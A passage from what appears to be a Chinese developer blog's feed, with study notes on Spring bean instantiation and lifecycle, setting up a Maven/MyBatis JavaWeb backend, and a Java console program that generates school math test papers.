TestService&quot;</span>);</span><br><span class="line">    dao.test();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDao</span><span class="params">(TestDao dao)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.dao = dao;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test3</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">    <span class="type">TestService</span> <span class="variable">testService</span> <span class="operator">=</span> (TestService) ctx.getBean(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>运行结果</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Generator is Running....</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure><h2 id="FactoryBean实例化"><a href="#FactoryBean实例化" class="headerlink" title="FactoryBean实例化"></a>FactoryBean实例化</h2><p>通过工厂的方式来实例化Bean也是比较实用的方式</p><h3 id="1-创建工厂类"><a href="#1-创建工厂类" class="headerlink" title="1.创建工厂类"></a>1.创建工厂类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDaoFactory</span> <span class="keyword">implements</span> <span class="title class_">FactoryBean</span>&lt;TestDao&gt; &#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> TestDao <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TestDaoImpl</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> Class&lt;?&gt; getObjectType() &#123;</span><br><span class="line">    <span class="keyword">return</span> TestDao.class;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSingleton</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中isSingleton()方法用来设置是否创建单例</p><h3 id="2-设置配置文件"><a href="#2-设置配置文件" class="headerlink" title="2.设置配置文件"></a>2.设置配置文件</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dao&quot;</span> <span class="attr">name</span>=<span class="string">&quot;testDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.Learning1.factory.TestDaoFactoryBean&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h3 id="测试运行"><a href="#测试运行" class="headerlink" title="测试运行"></a>测试运行</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test4</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">    <span class="type">TestDao</span> <span class="variable">dao</span> <span class="operator">=</span> (TestDao) ctx.getBean(<span class="string">&quot;dao&quot;</span>);</span><br><span class="line">    System.out.println(dao);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>运行结果</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">com.Learning1.dao.impl.TestDaoImpl@192b07fd</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure><h1 id="Bean的生命周期"><a href="#Bean的生命周期" class="headerlink" title="Bean的生命周期"></a>Bean的生命周期</h1><h2 id="初始化容器"><a href="#初始化容器" class="headerlink" title="初始化容器"></a>初始化容器</h2><p>1.创建对象(内存分配)<br>2.执行构造方法<br>3.执行属性注入(set操作)<br>4.执行bean初始化方法</p><h2 id="使用Bean"><a href="#使用Bean" class="headerlink" title="使用Bean"></a>使用Bean</h2><p>执行业务逻辑操作</p><h2 id="关闭-销毁容器"><a href="#关闭-销毁容器" class="headerlink" title="关闭/销毁容器"></a>关闭/销毁容器</h2><p>执行Bean销毁方法</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;最近在学习SpringBoot，但是发现自己对Spring的一些基础知识不太了解，于是决定先学习Spring相关的一些知识再去了解SpringBoot，此类博客相当于是学习笔记，笔记源自&lt;a href=&quot;https://www.bilibili.c</summary>
      
    
    
    
    <category term="Spring" scheme="https://kallenblue.github.io/categories/Spring/"/>
    
    
    <category term="Ioc" scheme="https://kallenblue.github.io/tags/Ioc/"/>
    
    <category term="Bean" scheme="https://kallenblue.github.io/tags/Bean/"/>
    
  </entry>
  
  <entry>
    <title>从0开始启动一个javaweb项目(后端)</title>
    <link href="https://kallenblue.github.io/2022/09/21/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%90%AF%E5%8A%A8%E4%B8%80%E4%B8%AAjavaweb%E9%A1%B9%E7%9B%AE-%E5%90%8E%E7%AB%AF/"/>
    <id>https://kallenblue.github.io/2022/09/21/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%90%AF%E5%8A%A8%E4%B8%80%E4%B8%AAjavaweb%E9%A1%B9%E7%9B%AE-%E5%90%8E%E7%AB%AF/</id>
    <published>2022-09-21T14:53:29.000Z</published>
    <updated>2022-09-28T19:07:03.797Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>本次项目为前后端完全分离项目，当时拿到作业的时候我是不会javaweb的，完全是在b站现学的，这里贴上<a href="https://www.bilibili.com/video/BV1Qf4y1T7Hx/?p=93&spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=8e7575d97bbace3752791e78bd5fb587">视频地址</a>。我是跳着看的，因为之前是有一定的基础，只把自己不明白或者之前基础比较薄弱的地方看了。这个老师讲得很好，原理讲得很清楚，干货满满，真实体验也就是他们所讲的“多一句没有，少一句不行，用最短的时间，教会最实用的技术”，下面的文章。这里记录一下我项目的整个过程，我会从新建项目开始，重现我的整个项目，顺便复习一下学习成果</p></blockquote><h1 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h1><blockquote><p>javaweb框架，mybatis管理数据库，maven管理项目架构，tomcat本地网络服务器，MVC设计模式<br>#项目介绍<br>和上次那个<a href="http://kallenblue.cn/2022/09/13/%E4%B8%AD%E5%B0%8F%E5%AD%A6%E6%95%B0%E5%AD%A6%E5%8D%B7%E5%AD%90%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90%E7%A8%8B%E5%BA%8F/">题目生成程序</a>的需求类似，不过这次要求有前端，还附加了一些其他的功能，具体需求见此<a href="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/780f46f3-60ba-4407-b692-5b9945a31f66.docx">文档</a><br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/2bb1a851-19f2-4d8c-957f-bf936abae7f3.png"></p></blockquote><h1 id="1-创建项目"><a href="#1-创建项目" class="headerlink" title="1.创建项目"></a>1.创建项目</h1><p>idea创建新项目，选择maven项目<br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/04f87283-b1e4-4f73-93a5-bfe9c6fb9a98.png"><br>给项目任意命个名<br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/b1b49cda-8e23-47d6-92f1-fbbd4a0b3796.png"><br>创建完项目之后配置maven<br>选择maven版本，maven的设置以及本地maven仓库的路径<br>关于maven的配置可以自行上网搜索或看<a href="https://www.bilibili.com/video/BV1Qf4y1T7Hx?p=44&vd_source=8e7575d97bbace3752791e78bd5fb587">b站上的视频</a><br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/ef025a3c-ca23-4258-b7b1-cf4d8fa3b9d7.png"><br>在pom.xml文件中设置打包为war，标识为web项目</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br></pre></td></tr></table></figure><p>目前项目还缺失了一个核心的webapp目录，可以手动创建，也可以利用idea帮我们创建<br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/a1e7d2bd-87e2-4770-b850-62fc53acb99b.png"><br>创建好目录还缺失一个web.xml文件，也是可以用idea创建，注意修改一下默认路径<br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/128f42a8-8ea8-47fd-af43-ef4334e2603a.png"></p><p>#2.目录架构<br>MVC设计模式<br>M:Model，业务模型，处理业务<br>V:View,视图，界面展示<br>C:Controller，控制器，处理请求，调用模型和视图<br>展示一下主体目录结构<br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/05165e28-6d90-4af4-a8c2-3100e6ec3e44.png"><br>##java</p><blockquote><p>存放主要的java代码<br>###mapper<br>数据访问层/也叫dao层<br>###pojo<br>模型<br>###service<br>业务逻辑层<br>###utils<br>工具类<br>###web<br>表现层<br>#3.根据需求文档，一一实现接口<br>在开发之前，效率最高的方式是先和前端人员商量好各个接口，然后逐一实现，这样能够明确方向，有个大体的框架</p></blockquote><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/7d212b76-1a50-4142-ae3a-4a2dbe759b9a.png"></p><blockquote><p>我们根据需求文档，使用APIfox提前编写好了各个接口，下面根据逻辑顺序来编写接口</p></blockquote><h2 id="1-登录验证"><a href="#1-登录验证" class="headerlink" title="1.登录验证"></a>1.登录验证</h2><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/5940767a-d93a-4533-803b-3ad31787ecec.png"></p><blockquote><p>接口名为：LoginValidate<br>传入用户的账户和密码，检验后返回结果</p></blockquote><p>在实现接口之前，我们还有其他的准备要做，从这个接口需求就知道了，首先需要一个数据库，下面我们用mybatis来创建我们的数据库</p><h3 id="mybatis管理数据库"><a href="#mybatis管理数据库" class="headerlink" title="mybatis管理数据库"></a>mybatis管理数据库</h3><p>在这个案例中，我们的数据库会非常简单，只需要记录用户的账号和密码就行了，于是创建table的ddl如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span></span><br><span class="line">(</span><br><span class="line">    account  <span class="type">varchar</span>(<span class="number">12</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">        <span class="keyword">primary</span> key,</span><br><span class="line">    password <span class="type">varchar</span>(<span class="number">15</span>) <span class="keyword">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>创建好数据库后，在我们的pom.xml中引入mybatis和mysql依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后去到<a href="https://mybatis.net.cn/getting-started.html">mybatis的官网</a>获取到mybatis的配置文件内容，里面有一个简单的模板，可以套用一下<br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/393ec90c-ad38-419e-9493-cef70259e097.png"><br>在resources下创建mybatis-config.xml配置文件，并将官网的内容复制进去，更改一下个人的数据库信息即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">configuration</span></span></span><br><span class="line"><span class="meta">  <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">  <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/testgeneration?useSSL=false<span class="symbol">&amp;amp;</span>allowPublicKeyRetrieval=true<span class="symbol">&amp;amp;</span>serverTimezone=UTC&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1234&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;org/mybatis/example/BlogMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;本次项目为前后端完全分离项目，当时拿到作业的时候我是不会javaweb的，完全是在b站现</summary>
      
    
    
    
    <category term="课程作业" scheme="https://kallenblue.github.io/categories/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/"/>
    
    
    <category term="javaweb" scheme="https://kallenblue.github.io/tags/javaweb/"/>
    
  </entry>
  
  <entry>
    <title>中小学数学卷子自动生成程序</title>
    <link href="https://kallenblue.github.io/2022/09/13/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/%E4%B8%AD%E5%B0%8F%E5%AD%A6%E6%95%B0%E5%AD%A6%E5%8D%B7%E5%AD%90%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90%E7%A8%8B%E5%BA%8F/"/>
    <id>https://kallenblue.github.io/2022/09/13/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/%E4%B8%AD%E5%B0%8F%E5%AD%A6%E6%95%B0%E5%AD%A6%E5%8D%B7%E5%AD%90%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90%E7%A8%8B%E5%BA%8F/</id>
    <published>2022-09-13T02:47:30.000Z</published>
    <updated>2022-09-14T07:23:34.221Z</updated>
    
    <content type="html"><![CDATA[<div class="note simple"><p>本来是不打算写这个课程作业的博客的，但是后续结队编程又需要和队友相互交流代码，而我当时写代码的时候也没有过多的注释，为了能够让我的结队队友“、、”能够更轻松的(至少不会想捶我)完成课程任务，我还是准备写篇博客简单介绍一下课程项目。</p></div><div class="note success simple"><p>PS:也附上“、、”的<a href="https://xiaercloud.top/intro-self/">博客网站</a>，也是关于这次的项目的</p></div><h1 id="程序要求"><a href="#程序要求" class="headerlink" title="程序要求"></a>程序要求</h1><p><a href="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/efa06a73-4166-4fbd-bc39-c1f120d3ec30.docx">点击下载需求文件</a><br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/c97d5b25-fc87-4c8d-b6ad-a874bd066b8a.jpg"></p><h1 id="程序架构"><a href="#程序架构" class="headerlink" title="程序架构"></a>程序架构</h1><p>使用java实现程序，总有5个类，并使用数据库来查重</p><h2 id="1-Main"><a href="#1-Main" class="headerlink" title="1.Main"></a>1.Main</h2><p>程序运行的地方，主要处理逻辑，程序状态和用户交互之类的</p><h2 id="2-User抽象类"><a href="#2-User抽象类" class="headerlink" title="2.User抽象类"></a>2.User抽象类</h2><p>代表出题者的一个抽象类，拥有登录(连接数据库)，出题，检查题目是否重复的功能</p><h2 id="3-Primary，JuniorHigh，High三个实例用户类"><a href="#3-Primary，JuniorHigh，High三个实例用户类" class="headerlink" title="3.Primary，JuniorHigh，High三个实例用户类"></a>3.Primary，JuniorHigh，High三个实例用户类</h2><p>继承User，并实现出题的具体方法</p><h2 id="4-mysql数据库"><a href="#4-mysql数据库" class="headerlink" title="4.mysql数据库"></a>4.mysql数据库</h2><p>实现题目的查重功能和用户信息存储功能</p><hr><div class="note simple"><p>下面将从Main类开始介绍整个程序</p></div><h2 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">state</span> <span class="operator">=</span> LOGIN;<span class="comment">//代表程序状态，初始状态为登录状态</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">LOGIN</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//定义宏LOGIN</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">LOGGED_IN</span> <span class="operator">=</span> <span class="number">1</span>;<span class="comment">//定义宏LOGGED_IN</span></span><br><span class="line"><span class="keyword">private</span> User user;<span class="comment">//当前程序的使用用户</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);<span class="comment">//实例化输入对象</span></span><br></pre></td></tr></table></figure><h3 id="main方法，程序入口"><a href="#main方法，程序入口" class="headerlink" title="main方法，程序入口"></a>main方法，程序入口</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException, ClassNotFoundException &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;中小学数学卷子自动生成程序&quot;</span>);</span><br><span class="line">    <span class="type">Main</span> <span class="variable">main</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">//根据程序状态实现不同功能</span></span><br><span class="line">        <span class="keyword">switch</span> (main.state) &#123;</span><br><span class="line">            <span class="keyword">case</span> LOGIN:</span><br><span class="line">                <span class="comment">//实现登录功能</span></span><br><span class="line">                main.processLogin();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> LOGGED_IN:</span><br><span class="line">                <span class="comment">//实现登录后功能</span></span><br><span class="line">                main.processLoggedIn();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="processLogin"><a href="#processLogin" class="headerlink" title="processLogin()"></a>processLogin()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processLogin</span><span class="params">()</span> <span class="keyword">throws</span> SQLException, ClassNotFoundException &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;请输入用户名、密码&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">account</span> <span class="operator">=</span> scanner.next();</span><br><span class="line">    <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> scanner.next();</span><br><span class="line">    <span class="comment">//根据输入的账号密码获取用户实例对象</span></span><br><span class="line">    user = User.login(account, password);</span><br><span class="line">    <span class="keyword">if</span> (user == <span class="literal">null</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入正确的用户名、密码&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;当前选择为&quot;</span> + user.getDifficultyType() + <span class="string">&quot;出题&quot;</span>);</span><br><span class="line">        <span class="comment">//将状态更新为已登录</span></span><br><span class="line">        state = LOGGED_IN;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="processLoggedIn"><a href="#processLoggedIn" class="headerlink" title="processLoggedIn()"></a>processLoggedIn()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processLoggedIn</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;准备生成&quot;</span> + user.getDifficultyType() + <span class="string">&quot;数学题目，请输入生成题目数量（输入-1将退出当前用户，重新登录）：&quot;</span>);</span><br><span class="line">    <span class="comment">//接收用户输入</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">scannerContent</span> <span class="operator">=</span> scanner.next();</span><br><span class="line">    <span class="comment">//监测用户输入是否为int型数据</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">questionsNumber</span> <span class="operator">=</span> Integer.parseInt(scannerContent);</span><br><span class="line">        <span class="comment">//-1为退出登录，将状态重置为登录状态，并将用户对象置为null</span></span><br><span class="line">        <span class="keyword">if</span> (questionsNumber == -<span class="number">1</span>) &#123;</span><br><span class="line">            state = LOGIN;</span><br><span class="line">            user = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (questionsNumber &gt;= <span class="number">10</span> &amp;&amp; questionsNumber &lt;= <span class="number">30</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;指令正确&quot;</span>);</span><br><span class="line">            <span class="comment">//开始生产题目，传入的参数为：用户的难度类型，题目数量</span></span><br><span class="line">            user.generateQuestionsByType(user.getDifficultyType(), questionsNumber);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;请输入正确的指令&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//用户输入为非int型，监测是否为“切换为”指令</span></span><br><span class="line">    <span class="keyword">catch</span> 